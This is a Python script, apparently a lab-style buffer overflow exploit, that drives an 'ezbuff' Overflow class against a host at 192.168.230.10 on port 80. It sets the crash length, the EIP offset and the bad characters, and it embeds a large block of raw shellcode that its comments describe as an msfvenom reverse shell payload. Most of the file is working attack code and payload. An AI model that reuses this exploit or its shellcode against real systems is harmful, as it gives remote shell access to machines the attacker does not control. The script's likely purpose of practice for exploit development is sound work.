#!/usr/bin/env python3

from ezbuff.src.overflow import Overflow

def main():
	# Instanstantiate `Overflow` object
	obj = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)
	# print(repr(obj), "\n")
	# print(obj)

	# Change the target IP if running in interactive Python interpreter
	# obj.targ_ip = "127.0.0.1"

	# Change the target port number if running objs in interactive Python interpreter
	# obj.targ_port = 443

	# The number of seconds to wait in between the fuzzing process,
	# default = 10
	# obj.fuzz_interval_seconds = 1

	# Set the increment of the fuzzer to be 150 as opposed to
	# the default of 100
	# obj.fuzz_increment = 150

	# Fuzz the vulnerable application
	# obj.fuzz()

	# Sets the number of bytes to crash the application.
	# Make sure to accomodate space for reverse shell!!
	obj.num_bytes_crash = 1200

	# Set the offset after running the functions to find offset value
	obj.offset = 780

	# Add bad characters to objects list containing bad characters found
	# after sending characters payload.
	obj.add_bad_char("\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")

	# Send payload with characters to find bad characters.
	obj.send_bad_chars()

	# Sending pattern to determine offset
	# obj.send_pattern()

	# Get offset 
	# obj.get_offset("30416B30")

	# Set the memory address to jump to after finding valid memory address
	# containing `jump` instructions set in x86 architecture
	# obj.jump_eip = b"\x83\x0c\x09\x10"
	# obj.test("eip")

	# reverse shell payload
	shellcode = (
"\xda\xcd\xd9\x74\x24\xf4\xba\x10\xa6\x39\xe8\x5e\x2b\xc9\xb1"
"\x52\x31\x56\x17\x83\xc6\x04\x03\x46\xb5\xdb\x1d\x9a\x51\x99"
"\xde\x62\xa2\xfe\x57\x87\x93\x3e\x03\xcc\x84\x8e\x47\x80\x28"
"\x64\x05\x30\xba\x08\x82\x37\x0b\xa6\xf4\x76\x8c\x9b\xc5\x19"
"\x0e\xe6\x19\xf9\x2f\x29\x6c\xf8\x68\x54\x9d\xa8\x21\x12\x30"
"\x5c\x45\x6e\x89\xd7\x15\x7e\x89\x04\xed\x81\xb8\x9b\x65\xd8"
"\x1a\x1a\xa9\x50\x13\x04\xae\x5d\xed\xbf\x04\x29\xec\x69\x55"
"\xd2\x43\x54\x59\x21\x9d\x91\x5e\xda\xe8\xeb\x9c\x67\xeb\x28"
"\xde\xb3\x7e\xaa\x78\x37\xd8\x16\x78\x94\xbf\xdd\x76\x51\xcb"
"\xb9\x9a\x64\x18\xb2\xa7\xed\x9f\x14\x2e\xb5\xbb\xb0\x6a\x6d"
"\xa5\xe1\xd6\xc0\xda\xf1\xb8\xbd\x7e\x7a\x54\xa9\xf2\x21\x31"
"\x1e\x3f\xd9\xc1\x08\x48\xaa\xf3\x97\xe2\x24\xb8\x50\x2d\xb3"
"\xbf\x4a\x89\x2b\x3e\x75\xea\x62\x85\x21\xba\x1c\x2c\x4a\x51"
"\xdc\xd1\x9f\xf6\x8c\x7d\x70\xb7\x7c\x3e\x20\x5f\x96\xb1\x1f"
"\x7f\x99\x1b\x08\xea\x60\xcc\xf7\x43\x1d\xea\x90\x91\xe1\xe2"
"\x49\x1f\x07\x68\x9a\x49\x90\x05\x03\xd0\x6a\xb7\xcc\xce\x17"
"\xf7\x47\xfd\xe8\xb6\xaf\x88\xfa\x2f\x40\xc7\xa0\xe6\x5f\xfd"
"\xcc\x65\xcd\x9a\x0c\xe3\xee\x34\x5b\xa4\xc1\x4c\x09\x58\x7b"
"\xe7\x2f\xa1\x1d\xc0\xeb\x7e\xde\xcf\xf2\xf3\x5a\xf4\xe4\xcd"
"\x63\xb0\x50\x82\x35\x6e\x0e\x64\xec\xc0\xf8\x3e\x43\x8b\x6c"
"\xc6\xaf\x0c\xea\xc7\xe5\xfa\x12\x79\x50\xbb\x2d\xb6\x34\x4b"
"\x56\xaa\xa4\xb4\x8d\x6e\xd4\xfe\x8f\xc7\x7d\xa7\x5a\x5a\xe0"
"\x58\xb1\x99\x1d\xdb\x33\x62\xda\xc3\x36\x67\xa6\x43\xab\x15"
"\xb7\x21\xcb\x8a\xb8\x63")
	# `get_payload` takes a parameter which is the name of the reverse shell file you created with msfvenom
	# Don't forget to specify a format in c programming language
	# obj.send_payload(shellcode)

if __name__ == '__main__':
	main()
